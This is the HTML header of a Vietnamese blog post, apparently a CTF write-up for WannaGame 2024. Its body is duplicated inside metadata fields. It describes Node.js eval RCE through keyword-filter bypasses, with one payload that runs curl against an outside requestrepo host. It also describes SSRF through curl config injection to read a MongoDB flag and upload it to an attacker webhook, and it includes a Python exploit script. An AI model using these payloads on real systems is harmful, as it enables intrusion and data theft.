<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="WannaGame" />
<meta property="og:locale" content="en" />
<meta name="description" content="WannaGame vừa mới kết thúc, mình xin viết lại một số bài mà mình làm được, giải này mình khá may mắn khi giải được 2 bài và mình cũng học được rất nhiều thứ từ giải này. newchall 1 2 3 4 5 This is a simple calc program,let&#39;s try /exec?q=9*10. Author: dcthinh http://45.122.249.68:20011 Bài này cho một trang web có chức năng như trên và mình đoán khá là chắc rằng tất cả những gì mình nhập vào sẽ được đưa vào eval nên chúng ta cứ thử một số payload đơn giản vào trước. 1 require(&quot;child_process&quot;).spawnSync(&#39;ls&#39;).output.toString() Và có vẻ như là bị chặn, mình nghĩ là có thể chặn một số từ khóa như require hoặc child_process nên mình sẽ thử một số payload khác Payload 1: 1 global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls&#39;).toString() Tất nhiên cái này sẽ bị chặn vì có từ khóa require nên mình sẽ tìm cách để bypass cái này. Chúng ta có thể gọi require như sau 1 global.process.mainModule[&quot;require&quot;] Ta có thể đổi require thành requir\145 (\145 là mã octal của e) vì trong quá trình thực thi requir\145 sẽ được chuyển thành require và chúng ta có thể lợi dụng cái này để bypass filters Payload cuối cùng 1 global.process.mainModule[&quot;requir\145&quot;](&#39;chil\144_proces\163&#39;)[&quot;spaw\156Sy\156c&quot;](&#39;cat&#39;,[&#39;flag.txt&#39;]).output.toString(); Và mình có được flag Sau khi dump ra được source thì đây là các chuỗi bị chặn 1 blacklist = [&#39;system&#39;, &#39;child_process&#39;, &#39;exec&#39;, &#39;spawn&#39;, &#39;eval&#39;, &#39;require&#39;]; Payload 2: Note: Cách này mình đã đọc được từ writeup của các giải amstrong2024 và TSG2023 và tham khảo của anh shin24 link mình sẽ đính kèm bên dưới 1 2 3 4 5 6 7 toString.constructor.prototype.toString=toString.constructor.prototype.call; var a=[&quot;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl http://yh9wz5br.requestrepo.com&#39;)&quot;]; a[1]=&quot;x&quot;; b={}; b[Symbol.hasInstance]=a.sort; b[&quot;__proto__&quot;]=a; toString.constructor instanceof b; Giải thích sơ qua về payload này Đầu tiên chúng ta sẽ gọi đến function toString và gán giá trị của function call cho nó Tiếp theo ta tạo một mảng a với giá trị đầu tiên là payload mà ta muốn execute (payload này sẽ được thực thi trong anonymous function) Tiếp theo ta gán giá trị &#39;x&#39; cho a[1] (sẽ giải thích ở bên dưới vì sao có phần này) Sau đó tạo một object b với key là Symbol.hasInstance và value là a.sort Sau đó set __proto__ của b là a Cuối cùng là kiểm tra xem toString.constructor có phải là instance của b (thật ra đoạn này không hẳn là kiểm tra mà là điều kiện để RCE) Trước khi đi vào phần phân tích sâu hơn, mình sẽ giải thích về cách của instanceof hoạt động Syntax 1 object instanceof constructor Toán tử instanceof là toán tử dùng để kiểm tra xem một đối tượng có thuộc lớp nào đó hay không Ví dụ đơn giản như sau 1 2 3 4 class BOX {} let DI = new BOX(); console.log(DI instanceof BOX); //true Ngoài ra nếu constructor (phần bên phải của instanceof) có phương thức Symbol.hasInstance thì nó sẽ được ưu tiên gọi, với object (phần bên trái của instanceof) là tham số truyền vào còn bên phải là this sau đó dùng kết quả để trả về kết quả của instanceof Ví dụ 1: 1 2 3 4 5 6 7 8 9 BOX = {[Symbol.hasInstance]: (dib) =&gt; { // console.log(dib) return dib === &#39;dib&#39; }}; DI = &#39;dib&#39; console.log(DI instanceof BOX); //true Ví dụ 2: 1 2 3 4 5 6 7 8 9 10 a = [&#39;1&#39;,&#39;0&#39;] a.__proto__[&#39;loG&#39;] = function(a) { console.log(&quot;triggered&quot;) } BOX = {[Symbol.hasInstance]: a.loG}; DI = Function console.log(DI instanceof BOX); // &quot;triggered&quot; // console.log(a) Đến phần chính, đi sâu vào giải thích vì sao nó hoạt động 1 toString.constructor instanceof b; Khi câu lệnh này được thực thi thì: Khi instanceof được sử dụng thì nó sẽ tìm kiếm xem b có thuộc tính Symbol.hasInstance không? Nếu có thì sẽ thực thi gọi tới a.sort là this và toString.constructor (AKA Function) là tham số truyền vào Khi a.sort(function sort) được gọi đến thì bình thường thì nó sẽ cố gắng chuyển tất cả các phần tử trong mảng thành string bằng hàm toString() rồi so sánh bằng function truyền vào. Điều này vô tình trigger hàm call() chúng ta đã đổi ở lúc đầu và bây giờ cả array sẽ trở thành parameter của new Function Nói thêm ở phần này về lý do phải set b[__proto__]=a là vì sort là function của array nên chúng ta phải đổi prototype của nó thành array thì sort mới có thể được thực thi và hơn hết khi đó sort sẽ được thực thi trên b, b lúc này là một object nên sort sẽ cố gắng tìm kiếm array trong object này bằng cách tìm kiếm trong prototype của nó khi đó nó sẽ tìm được 1 array trong vì ta set prototype của b là a Giá trị return của new Function này sẽ là một anonymous với a[0] là function và a[1] là parameter 1 2 3 4 (function anonymous(x ) { process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl http://yh9wz5br.requestrepo.com&#39;) }) Để nói thêm một chút nữa thì flow của chương trình sẽ như sau trigger sort -&gt; sort nhận Function làm tham số -&gt; Function là hàm được sử dụng để ‘so sánh’ các phần tử bên trong mảng -&gt; Mỗi phần từ được chuyển qua string(trigger call function) -&gt; Trả về một anonymouse function -&gt; Cuối cùng giá trị sau khi ‘so sánh’ sẽ được trả về dưới dạng string (trigger call function) Đây là code mô phỏng lại quá trình sort 1 2 3 toString.constructor.prototype.toString=Function.call; Function(a[1].toString(),a[0].toString()).toString(); Từ đó ta RCE và lấy được flag Flag: W1{hehehe} P/S: thật ra cách này đúng là “dùng dao mổ trâu để giết gà” vì cách này dùng cho những bài với filter chặt và bị hạn chế nhiều thứ. Do mình có sử dụng cách này khi thi nên tiện thể phân tích luôn cách này CURR 1 2 3 4 5 6 Let explore my website!!! Author: dcthinh http://45.122.249.68:20014 Tóm tắt về source code của trang web này App này có 3 route ,/ , /api/login và /api/curr và mình sẽ tập trung vào route /api/curr Route này có chức năng là dùng lệnh curl với các options như là -d, …, và có một cái middleware là /api/login để kiểm tra login Users và Flag được lưu trong mongoDB và đọc code một lúc thì không có cách nào để login hay bypass login cả 1 2 3 4 5 6 7 const crypto = require(&quot;crypto&quot;); const app = db.getSiblingDB(&#39;app&#39;); app.users.insertOne({ user: &quot;admin&quot;, pass: crypto.randomBytes(64).toString(&quot;hex&quot;) }); const secret = db.getSiblingDB(&#39;secret&#39;); secret.flag.insertOne({ flag: process.env.FLAG || &quot;W1{REACTED}&quot; }); Nhưng nhìn kỉ lại midleware thì mình thấy một điều khá là lạ 1 2 3 4 5 6 7 const requiresLogin = (req, res, next) =&gt; { if (!req.session.user) { res.redirect(&quot;/?error=login first&quot;); } next(); }; Vì sao lại có next(); ở dưới cùng của middleware này, mình nghĩ là có vẻ như là dù không có login nhưng vẫn có thể đi tới endpoint sau chăng ? Và đúng là thế, nó sẽ chạy phần code phía sau nhưng mà chúng ta không thể thấy phần output thôi Đến phần /api/curr 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 app.post(&quot;/api/curr&quot;, requiresLogin, (req, res) =&gt; { let { url } = req.body; if (!url || typeof url !== &quot;string&quot;) { return res.json({ success: false, message: &quot;Invalid URL&quot; }); } try { let parsed = new URL(url); if (![&quot;http:&quot;, &quot;https:&quot;].includes(parsed.protocol)) throw new Error(&quot;Invalid URL&quot;); } catch (e) { return res.json({ success: false, message: e.message }); } const args = [ url ]; let { opt, data } = req.body; if (opt &amp;&amp; data &amp;&amp; typeof opt === &quot;string&quot; &amp;&amp; typeof data === &quot;string&quot;) { if (!/^-[A-Za-z]$/.test(opt)) { return res.json({ success: false, message: &quot;Invalid option&quot; }); } // check method if (opt === &quot;-d&quot; || [&quot;GET&quot;, &quot;POST&quot;].includes(data)) { args.push(opt, data); } } cp.spawn(&#39;curl&#39;, args, { timeout: 2000, cwd: &quot;/tmp&quot; }).on(&#39;close&#39;, (code) =&gt; { // save result to database res.json({ success: true, message: `The site is ${code === 0 ? &#39;up&#39; : &#39;down&#39;}` }); }); }); Phần này sẽ lấy URL của chúng ta và kiểm tra nó sau đó kiểm tra phần opt nếu nó qua được phần kiểm tra thì sẽ thực thi lệnh curr với các options mà ta thêm vào Phần kiểm tra opt khá là chặt. Đầu tiên kiểm tra xem opt có bắt đầu bằng - và sau đó 1 là 1 ký tự [a-zA-Z] không, tiếp sau đó kiểm tra opt một là -d và là data hay là 1 option bất kỳ và có data là GET, hoặc là POST. Và curl có hỗ trợ một options là -K (–config) option này giúp cho lệnh curl của chúng ta đọc từ một file text và sử dụng nó làm các options. Từ đó suy ra nếu mà có cách nào đó để chúng ta download file options của chúng ta về server và bắt server curl với options đó ta có thể curl tới bất kỳ URL nào Để thử thì đây là options thử nghiệm 1 2 --url &quot;http://XXXXXX.requestrepo.com&quot; user-agent = &quot;yuu&quot; Ta có thể setup một python http server và expose bằng ngrok để và dùng curl để download file bằng cách sau 1 url =xxxxx.NGROK.com/options.txt&amp;opt=-o&amp;data=GET Tiếp tục ta thử xem liệu nó có request đến server của mình với useragent là yuu không 1 url =xxxxxx.webhook.com&amp;opt=-K&amp;data=GET Vậy là có thể gửi tới bất kỳ url nào với bất kỳ options nào mà ta muốn Vậy với những thứ này thì làm sao lấy flag từ mongoDB đây? MongoDB giao tiếp thông qua MongoDB Wire Protocol. Người dùng có thể giao tiếp với database server thông qua TCP/IP. Vậy chúng ta có thể dùng gopher để và dùng curl để connect tới database server và lấy flag, nhưng tiếc là chúng ta không thể dùng gopher vì author đã set up như bên dưới Nhưng mà vẫn có một số protocol khác như telnet khi mà chúng cũng giao tiếp bằng TCP Vậy ta có thể gửi một binary file(TCP transfer - file này chứa một giao tiếp lấy flag) cho mongo database server để server trả cái flag về Ta có thể bắt file này bằng cách tạo một file để giả lập việc lấy flag và sử dụng tcpdump để bắt gói tin đó File js dùng để lấy flag 1 2 3 4 5 6 7 8 const { MongoClient } = require( &quot;mongodb&quot; ); const client = new MongoClient( &quot;mongodb://mongodb:27017/&quot; ); client.connect().then(async () =&gt; { const flag = client.db( &quot;secret&quot; ).collection( &quot;flag&quot; ); var flag_1 = await flag.findOne() console.log(flag_1); client.close(); } ); Đây là nội dung lúc giao tiếp với server Ta có thể tải nội dung TCP payload về, đây chính là quá trình mà server giao tiếp với database Thử dùng file này để giao tiếp xem có được không Nó có trả về flag vậy có nghĩa là chúng ta có thể dùng cách này Vậy cuối cùng đây là cách làm Tải file options với nội dung bên dưới url=http://NGROKSERVER.com/options.txt&amp;opt=-o&amp;data=GET 1 2 3 4 --max-time 1 --upload-file &quot;POST&quot; --url &quot;telnet://mongodb:27017&quot; -o &quot;GET&quot; Tiếp theo tải file data tcp mà ta bắt được vào server url=http://NGROKSERVER.com/test.data.dat&amp;opt=-o&amp;data=POST Sau đó request đến một trang web bất kỳ với option là file GET(options mà ta lúc nãy gửi) url=http://ABCXYZ.COM&amp;opt=-K&amp;data=GET ( lúc này là lúc mà chúng ta giao tiếp với database để lấy flag và lưu vào GET) Cuối cùng là upload file GET về server của ta url=http://WEBHOOKSERVER.COM&amp;opt=-T&amp;data=GET Payload tự động lấy flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 import requests import time # URL = &quot;http://localhost:8888&quot; URL = &quot;http://45.122.249.68:20014&quot; data = { &quot;url&quot;: &quot;https://NGROKSERVER/options.txt&quot;, &quot;opt&quot;: &quot;-o&quot;, &quot;data&quot;: &quot;GET&quot; } r = requests.post(f&quot;{URL}/api/curr&quot;, data=data) time.sleep(1) data = { &quot;url&quot;: &quot;https://NGROKSERVER/test.data.dat&quot;, &quot;opt&quot;: &quot;-o&quot;, &quot;data&quot;: &quot;POST&quot; } r = requests.post(f&quot;{URL}/api/curr&quot;, data=data) time.sleep(1) data = { &quot;url&quot;: &quot;http://ABCXYZ.COM&quot;, &quot;opt&quot;: &quot;-K&quot;, &quot;data&quot;: &quot;GET&quot; } r = requests.post(f&quot;{URL}/api/curr&quot;, data=data) time.sleep(5) data = { &quot;url&quot;: &quot;http://WEBHOOKSERVER.COM&quot;, &quot;opt&quot;: &quot;-T&quot;, &quot;data&quot;: &quot;GET&quot; } r = requests.post(f&quot;{URL}/api/curr&quot;, data=data) Flag: W1{nice_try_without_gopher} Kết bài" />
<meta property="og:description" content="WannaGame vừa mới kết thúc, mình xin viết lại một số bài mà mình làm được, giải này mình khá may mắn khi giải được 2 bài và mình cũng học được rất nhiều thứ từ giải này. newchall 1 2 3 4 5 This is a simple calc program,let&#39;s try /exec?q=9*10. Author: dcthinh http://45.122.249.68:20011 Bài này cho một trang web có chức năng như trên và mình đoán khá là chắc rằng tất cả những gì mình nhập vào sẽ được đưa vào eval nên chúng ta cứ thử một số payload đơn giản vào trước. 1 require(&quot;child_process&quot;).spawnSync(&#39;ls&#39;).output.toString() Và có vẻ như là bị chặn, mình nghĩ là có thể chặn một số từ khóa như require hoặc child_process nên mình sẽ thử một số payload khác Payload 1: 1 global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls&#39;).toString() Tất nhiên cái này sẽ bị chặn vì có từ khóa require nên mình sẽ tìm cách để bypass cái này. Chúng ta có thể gọi require như sau 1 global.process.mainModule[&quot;require&quot;] Ta có thể đổi require thành requir\145 (\145 là mã octal của e) vì trong quá trình thực thi requir\145 sẽ được chuyển thành require và chúng ta có thể lợi dụng cái này để bypass filters Payload cuối cùng 1 global.process.mainModule[&quot;requir\145&quot;](&#39;chil\144_proces\163&#39;)[&quot;spaw\156Sy\156c&quot;](&#39;cat&#39;,[&#39;flag.txt&#39;]).output.toString(); Và mình có được flag Sau khi dump ra được source thì đây là các chuỗi bị chặn 1 blacklist = [&#39;system&#39;, &#39;child_process&#39;, &#39;exec&#39;, &#39;spawn&#39;, &#39;eval&#39;, &#39;require&#39;]; Payload 2: Note: Cách này mình đã đọc được từ writeup của các giải amstrong2024 và TSG2023 và tham khảo của anh shin24 link mình sẽ đính kèm bên dưới 1 2 3 4 5 6 7 toString.constructor.prototype.toString=toString.constructor.prototype.call; var a=[&quot;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl http://yh9wz5br.requestrepo.com&#39;)&quot;]; a[1]=&quot;x&quot;; b={}; b[Symbol.hasInstance]=a.sort; b[&quot;__proto__&quot;]=a; toString.constructor instanceof b; Giải thích sơ qua về payload này Đầu tiên chúng ta sẽ gọi đến function toString và gán giá trị của function call cho nó Tiếp theo ta tạo một mảng a với giá trị đầu tiên là payload mà ta muốn execute (payload này sẽ được thực thi trong anonymous function) Tiếp theo ta gán giá trị &#39;x&#39; cho a[1] (sẽ giải thích ở bên dưới vì sao có phần này) Sau đó tạo một object b với key là Symbol.hasInstance và value là a.sort Sau đó set __proto__ của b là a Cuối cùng là kiểm tra xem toString.constructor có phải là instance của b (thật ra đoạn này không hẳn là kiểm tra mà là điều kiện để RCE) Trước khi đi vào phần phân tích sâu hơn, mình sẽ giải thích về cách của instanceof hoạt động Syntax 1 object instanceof constructor Toán tử instanceof là toán tử dùng để kiểm tra xem một đối tượng có thuộc lớp nào đó hay không Ví dụ đơn giản như sau 1 2 3 4 class BOX {} let DI = new BOX(); console.log(DI instanceof BOX); //true Ngoài ra nếu constructor (phần bên phải của instanceof) có phương thức Symbol.hasInstance thì nó sẽ được ưu tiên gọi, với object (phần bên trái của instanceof) là tham số truyền vào còn bên phải là this sau đó dùng kết quả để trả về kết quả của instanceof Ví dụ 1: 1 2 3 4 5 6 7 8 9 BOX = {[Symbol.hasInstance]: (dib) =&gt; { // console.log(dib) return dib === &#39;dib&#39; }}; DI = &#39;dib&#39; console.log(DI instanceof BOX); //true Ví dụ 2: 1 2 3 4 5 6 7 8 9 10 a = [&#39;1&#39;,&#39;0&#39;] a.__proto__[&#39;loG&#39;] = function(a) { console.log(&quot;triggered&quot;) } BOX = {[Symbol.hasInstance]: a.loG}; DI = Function console.log(DI instanceof BOX); // &quot;triggered&quot; // console.log(a) Đến phần chính, đi sâu vào giải thích vì sao nó hoạt động 1 toString.constructor instanceof b; Khi câu lệnh này được thực thi thì: Khi instanceof được sử dụng thì nó sẽ tìm kiếm xem b có thuộc tính Symbol.hasInstance không? Nếu có thì sẽ thực thi gọi tới a.sort là this và toString.constructor (AKA Function) là tham số truyền vào Khi a.sort(function sort) được gọi đến thì bình thường thì nó sẽ cố gắng chuyển tất cả các phần tử trong mảng thành string bằng hàm toString() rồi so sánh bằng function truyền vào. Điều này vô tình trigger hàm call() chúng ta đã đổi ở lúc đầu và bây giờ cả array sẽ trở thành parameter của new Function Nói thêm ở phần này về lý do phải set b[__proto__]=a là vì sort là function của array nên chúng ta phải đổi prototype của nó thành array thì sort mới có thể được thực thi và hơn hết khi đó sort sẽ được thực thi trên b, b lúc này là một object nên sort sẽ cố gắng tìm kiếm array trong object này bằng cách tìm kiếm trong prototype của nó khi đó nó sẽ tìm được 1 array trong vì ta set prototype của b là a Giá trị return của new Function này sẽ là một anonymous với a[0] là function và a[1] là parameter 1 2 3 4 (function anonymous(x ) { process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl http://yh9wz5br.requestrepo.com&#39;) }) Để nói thêm một chút nữa thì flow của chương trình sẽ như sau trigger sort -&gt; sort nhận Function làm tham số -&gt; Function là hàm được sử dụng để ‘so sánh’ các phần tử bên trong mảng -&gt; Mỗi phần từ được chuyển qua string(trigger call function) -&gt; Trả về một anonymouse function -&gt; Cuối cùng giá trị sau khi ‘so sánh’ sẽ được trả về dưới dạng string (trigger call function) Đây là code mô phỏng lại quá trình sort 1 2 3 toString.constructor.prototype.toString=Function.call; Function(a[1].toString(),a[0].toString()).toString(); Từ đó ta RCE và lấy được flag Flag: W1{hehehe} P/S: thật ra cách này đúng là “dùng dao mổ trâu để giết gà” vì cách này dùng cho những bài với filter chặt và bị hạn chế nhiều thứ. Do mình có sử dụng cách này khi thi nên tiện thể phân tích luôn cách này CURR 1 2 3 4 5 6 Let explore my website!!! Author: dcthinh http://45.122.249.68:20014 Tóm tắt về source code của trang web này App này có 3 route ,/ , /api/login và /api/curr và mình sẽ tập trung vào route /api/curr Route này có chức năng là dùng lệnh curl với các options như là -d, …, và có một cái middleware là /api/login để kiểm tra login Users và Flag được lưu trong mongoDB và đọc code một lúc thì không có cách nào để login hay bypass login cả 1 2 3 4 5 6 7 const crypto = require(&quot;crypto&quot;); const app = db.getSiblingDB(&#39;app&#39;); app.users.insertOne({ user: &quot;admin&quot;, pass: crypto.randomBytes(64).toString(&quot;hex&quot;) }); const secret = db.getSiblingDB(&#39;secret&#39;); secret.flag.insertOne({ flag: process.env.FLAG || &quot;W1{REACTED}&quot; }); Nhưng nhìn kỉ lại midleware thì mình thấy một điều khá là lạ 1 2 3 4 5 6 7 const requiresLogin = (req, res, next) =&gt; { if (!req.session.user) { res.redirect(&quot;/?error=login first&quot;); } next(); }; Vì sao lại có next(); ở dưới cùng của middleware này, mình nghĩ là có vẻ như là dù không có login nhưng vẫn có thể đi tới endpoint sau chăng ? Và đúng là thế, nó sẽ chạy phần code phía sau nhưng mà chúng ta không thể thấy phần output thôi Đến phần /api/curr 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 app.post(&quot;/api/curr&quot;, requiresLogin, (req, res) =&gt; { let { url } = req.body; if (!url || typeof url !== &quot;string&quot;) { return res.json({ success: false, message: &quot;Invalid URL&quot; }); } try { let parsed = new URL(url); if (![&quot;http:&quot;, &quot;https:&quot;].includes(parsed.protocol)) throw new Error(&quot;Invalid URL&quot;); } catch (e) { return res.json({ success: false, message: e.message }); } const args = [ url ]; let { opt, data } = req.body; if (opt &amp;&amp; data &amp;&amp; typeof opt === &quot;string&quot; &amp;&amp; typeof data === &quot;string&quot;) { if (!/^-[A-Za-z]$/.test(opt)) { return res.json({ success: false, message: &quot;Invalid option&quot; }); } // check method if (opt === &quot;-d&quot; || [&quot;GET&quot;, &quot;POST&quot;].includes(data)) { args.push(opt, data); } } cp.spawn(&#39;curl&#39;, args, { timeout: 2000, cwd: &quot;/tmp&quot; }).on(&#39;close&#39;, (code) =&gt; { // save result to database res.json({ success: true, message: `The site is ${code === 0 ? &#39;up&#39; : &#39;down&#39;}` }); }); }); Phần này sẽ lấy URL của chúng ta và kiểm tra nó sau đó kiểm tra phần opt nếu nó qua được phần kiểm tra thì sẽ thực thi lệnh curr với các options mà ta thêm vào Phần kiểm tra opt khá là chặt. Đầu tiên kiểm tra xem opt có bắt đầu bằng - và sau đó 1 là 1 ký tự [a-zA-Z] không, tiếp sau đó kiểm tra opt một là -d và là data hay là 1 option bất kỳ và có data là GET, hoặc là POST. Và curl có hỗ trợ một options là -K (–config) option này giúp cho lệnh curl của chúng ta đọc từ một file text và sử dụng nó làm các options. Từ đó suy ra nếu mà có cách nào đó để chúng ta download file options của chúng ta về server và bắt server curl với options đó ta có thể curl tới bất kỳ URL nào Để thử thì đây là options thử nghiệm 1 2 --url &quot;http://XXXXXX.requestrepo.com&quot; user-agent = &quot;yuu&quot; Ta có thể setup một python http server và expose bằng ngrok để và dùng curl để download file bằng cách sau 1 url =xxxxx.NGROK.com/options.txt&amp;opt=-o&amp;data=GET Tiếp tục ta thử xem liệu nó có request đến server của mình với useragent là yuu không 1 url =xxxxxx.webhook.com&amp;opt=-K&amp;data=GET Vậy là có thể gửi tới bất kỳ url nào với bất kỳ options nào mà ta muốn Vậy với những thứ này thì làm sao lấy flag từ mongoDB đây? MongoDB giao tiếp thông qua MongoDB Wire Protocol. Người dùng có thể giao tiếp với database server thông qua TCP/IP. Vậy chúng ta có thể dùng gopher để và dùng curl để connect tới database server và lấy flag, nhưng tiếc là chúng ta không thể dùng gopher vì author đã set up như bên dưới Nhưng mà vẫn có một số protocol khác như telnet khi mà chúng cũng giao tiếp bằng TCP Vậy ta có thể gửi một binary file(TCP transfer - file này chứa một giao tiếp lấy flag) cho mongo database server để server trả cái flag về Ta có thể bắt file này bằng cách tạo một file để giả lập việc lấy flag và sử dụng tcpdump để bắt gói tin đó File js dùng để lấy flag 1 2 3 4 5 6 7 8 const { MongoClient } = require( &quot;mongodb&quot; ); const client = new MongoClient( &quot;mongodb://mongodb:27017/&quot; ); client.connect().then(async () =&gt; { const flag = client.db( &quot;secret&quot; ).collection( &quot;flag&quot; ); var flag_1 = await flag.findOne() console.log(flag_1); client.close(); } ); Đây là nội dung lúc giao tiếp với server Ta có thể tải nội dung TCP payload về, đây chính là quá trình mà server giao tiếp với database Thử dùng file này để giao tiếp xem có được không Nó có trả về flag vậy có nghĩa là chúng ta có thể dùng cách này Vậy cuối cùng đây là cách làm Tải file options với nội dung bên dưới url=http://NGROKSERVER.com/options.txt&amp;opt=-o&amp;data=GET 1 2 3 4 --max-time 1 --upload-file &quot;POST&quot; --url &quot;telnet://mongodb:27017&quot; -o &quot;GET&quot; Tiếp theo tải file data tcp mà ta bắt được vào server url=http://NGROKSERVER.com/test.data.dat&amp;opt=-o&amp;data=POST Sau đó request đến một trang web bất kỳ với option là file GET(options mà ta lúc nãy gửi) url=http://ABCXYZ.COM&amp;opt=-K&amp;data=GET ( lúc này là lúc mà chúng ta giao tiếp với database để lấy flag và lưu vào GET) Cuối cùng là upload file GET về server của ta url=http://WEBHOOKSERVER.COM&amp;opt=-T&amp;data=GET Payload tự động lấy flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 import requests import time # URL = &quot;http://localhost:8888&quot; URL = &quot;http://45.122.249.68:20014&quot; data = { &quot;url&quot;: &quot;https://NGROKSERVER/options.txt&quot;, &quot;opt&quot;: &quot;-o&quot;, &quot;data&quot;: &quot;GET&quot; } r = requests.post(f&quot;{URL}/api/curr&quot;, data=data) time.sleep(1) data = { &quot;url&quot;: &quot;https://NGROKSERVER/test.data.dat&quot;, &quot;opt&quot;: &quot;-o&quot;, &quot;data&quot;: &quot;POST&quot; } r = requests.post(f&quot;{URL}/api/curr&quot;, data=data) time.sleep(1) data = { &quot;url&quot;: &quot;http://ABCXYZ.COM&quot;, &quot;opt&quot;: &quot;-K&quot;, &quot;data&quot;: &quot;GET&quot; } r = requests.post(f&quot;{URL}/api/curr&quot;, data=data) time.sleep(5) data = { &quot;url&quot;: &quot;http://WEBHOOKSERVER.COM&quot;, &quot;opt&quot;: &quot;-T&quot;, &quot;data&quot;: &quot;GET&quot; } r = requests.post(f&quot;{URL}/api/curr&quot;, data=data) Flag: W1{nice_try_without_gopher} Kết bài" />
<link rel="canonical" href="http://localhost:4000/posts/Wannagame2024/" />
<meta property="og:url" content="http://localhost:4000/posts/Wannagame2024/" />
<meta property="og:site_name" content="Yuu’s blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-06-14T23:00:00+07:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="WannaGame" />
<meta name="twitter:site" content="@anzuukino" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-06-14T23:00:00+07:00","datePublished":"2024-06-14T23:00:00+07:00","description":"WannaGame vừa mới kết thúc, mình xin viết lại một số bài mà mình làm được, giải này mình khá may mắn khi giải được 2 bài và mình cũng học được rất nhiều thứ từ giải này. newchall 1 2 3 4 5 This is a simple calc program,let&#39;s try /exec?q=9*10. Author: dcthinh http://45.122.249.68:20011 Bài này cho một trang web có chức năng như trên và mình đoán khá là chắc rằng tất cả những gì mình nhập vào sẽ được đưa vào eval nên chúng ta cứ thử một số payload đơn giản vào trước. 1 require(&quot;child_process&quot;).spawnSync(&#39;ls&#39;).output.toString() Và có vẻ như là bị chặn, mình nghĩ là có thể chặn một số từ khóa như require hoặc child_process nên mình sẽ thử một số payload khác Payload 1: 1 global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls&#39;).toString() Tất nhiên cái này sẽ bị chặn vì có từ khóa require nên mình sẽ tìm cách để bypass cái này. Chúng ta có thể gọi require như sau 1 global.process.mainModule[&quot;require&quot;] Ta có thể đổi require thành requir\\145 (\\145 là mã octal của e) vì trong quá trình thực thi requir\\145 sẽ được chuyển thành require và chúng ta có thể lợi dụng cái này để bypass filters Payload cuối cùng 1 global.process.mainModule[&quot;requir\\145&quot;](&#39;chil\\144_proces\\163&#39;)[&quot;spaw\\156Sy\\156c&quot;](&#39;cat&#39;,[&#39;flag.txt&#39;]).output.toString(); Và mình có được flag Sau khi dump ra được source thì đây là các chuỗi bị chặn 1 blacklist = [&#39;system&#39;, &#39;child_process&#39;, &#39;exec&#39;, &#39;spawn&#39;, &#39;eval&#39;, &#39;require&#39;]; Payload 2: Note: Cách này mình đã đọc được từ writeup của các giải amstrong2024 và TSG2023 và tham khảo của anh shin24 link mình sẽ đính kèm bên dưới 1 2 3 4 5 6 7 toString.constructor.prototype.toString=toString.constructor.prototype.call; var a=[&quot;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl http://yh9wz5br.requestrepo.com&#39;)&quot;]; a[1]=&quot;x&quot;; b={}; b[Symbol.hasInstance]=a.sort; b[&quot;__proto__&quot;]=a; toString.constructor instanceof b; Giải thích sơ qua về payload này Đầu tiên chúng ta sẽ gọi đến function toString và gán giá trị của function call cho nó Tiếp theo ta tạo một mảng a với giá trị đầu tiên là payload mà ta muốn execute (payload này sẽ được thực thi trong anonymous function) Tiếp theo ta gán giá trị &#39;x&#39; cho a[1] (sẽ giải thích ở bên dưới vì sao có phần này) Sau đó tạo một object b với key là Symbol.hasInstance và value là a.sort Sau đó set __proto__ của b là a Cuối cùng là kiểm tra xem toString.constructor có phải là instance của b (thật ra đoạn này không hẳn là kiểm tra mà là điều kiện để RCE) Trước khi đi vào phần phân tích sâu hơn, mình sẽ giải thích về cách của instanceof hoạt động Syntax 1 object instanceof constructor Toán tử instanceof là toán tử dùng để kiểm tra xem một đối tượng có thuộc lớp nào đó hay không Ví dụ đơn giản như sau 1 2 3 4 class BOX {} let DI = new BOX(); console.log(DI instanceof BOX); //true Ngoài ra nếu constructor (phần bên phải của instanceof) có phương thức Symbol.hasInstance thì nó sẽ được ưu tiên gọi, với object (phần bên trái của instanceof) là tham số truyền vào còn bên phải là this sau đó dùng kết quả để trả về kết quả của instanceof Ví dụ 1: 1 2 3 4 5 6 7 8 9 BOX = {[Symbol.hasInstance]: (dib) =&gt; { // console.log(dib) return dib === &#39;dib&#39; }}; DI = &#39;dib&#39; console.log(DI instanceof BOX); //true Ví dụ 2: 1 2 3 4 5 6 7 8 9 10 a = [&#39;1&#39;,&#39;0&#39;] a.__proto__[&#39;loG&#39;] = function(a) { console.log(&quot;triggered&quot;) } BOX = {[Symbol.hasInstance]: a.loG}; DI = Function console.log(DI instanceof BOX); // &quot;triggered&quot; // console.log(a) Đến phần chính, đi sâu vào giải thích vì sao nó hoạt động 1 toString.constructor instanceof b; Khi câu lệnh này được thực thi thì: Khi instanceof được sử dụng thì nó sẽ tìm kiếm xem b có thuộc tính 